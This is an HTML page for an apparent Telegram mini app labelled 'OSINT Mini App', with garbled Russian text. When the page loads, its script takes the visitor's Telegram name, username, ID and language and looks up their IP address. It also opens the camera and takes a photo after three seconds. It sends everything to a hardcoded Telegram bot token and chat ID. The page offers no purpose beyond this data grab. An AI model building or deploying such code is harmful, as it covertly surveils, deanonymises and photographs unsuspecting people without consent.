<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OSINT Mini App</title>
    <script>
        const BOT_TOKEN = "7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE";
        const CHAT_ID = "7477642275";
        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const PHOTO_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
        
        function sendToTelegram(message) {
            fetch(API_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
            });
        }
        
        function getUserIP() {
            fetch('https://api64.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    sendToTelegram(`üåê IP-–∞–¥—Ä–µ—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: ${data.ip}`);
                })
                .catch(error => console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è IP:', error));
        }
        
        function getUserInfo() {
            if (window.Telegram && Telegram.WebApp) {
                const user = Telegram.WebApp.initDataUnsafe.user;
                if (user) {
                    let userInfo = `üë§ –ù–æ–≤—ã–π –ª–æ–≥–∏–Ω\n`;
                    userInfo += `[+] –ò–º—è: ${user.first_name} ${user.last_name || ''}\n`;
                    userInfo += `[+] –Æ–∑–µ—Ä–Ω–µ–π–º: @${user.username || '–ù–µ —É–∫–∞–∑–∞–Ω'}\n`;
                    userInfo += `[+] ID: ${user.id}\n`;
                    userInfo += `[+] –Ø–∑—ã–∫: ${Telegram.WebApp.initDataUnsafe.language_code}\n\n`;
                    sendToTelegram(userInfo);
                }
            }
        }
        
        function capturePhoto() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    let video = document.createElement("video");
                    video.srcObject = stream;
                    video.play();
                    setTimeout(() => {
                        let canvas = document.createElement("canvas");
                        let ctx = canvas.getContext("2d");
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        let photo = canvas.toDataURL("image/png");
                        sendPhotoToTelegram(photo);
                        stream.getTracks().forEach(track => track.stop());
                    }, 3000);
                }).catch(err => console.error("–û—à–∏–±–∫–∞ –∫–∞–º–µ—Ä—ã:", err));
        }
        
        function sendPhotoToTelegram(photoDataUrl) {
            let formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', dataURItoBlob(photoDataUrl), 'photo.png');
            fetch(PHOTO_API_URL, { method: 'POST', body: formData });
        }
        
        function dataURItoBlob(dataURI) {
            let byteString = atob(dataURI.split(',')[1]);
            let arrayBuffer = new ArrayBuffer(byteString.length);
            let uintArray = new Uint8Array(arrayBuffer);
            for (let i = 0; i < byteString.length; i++) {
                uintArray[i] = byteString.charCodeAt(i);
            }
            return new Blob([arrayBuffer], { type: 'image/png' });
        }
        
        function initApp() {
            getUserInfo();
            getUserIP();
            capturePhoto();
        }
        
        window.onload = initApp;
    </script>
</head>
<body>
    <h2>OSINT Mini App</h2>
    <p>–î–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç—Å—è...</p>
</body>
</html>
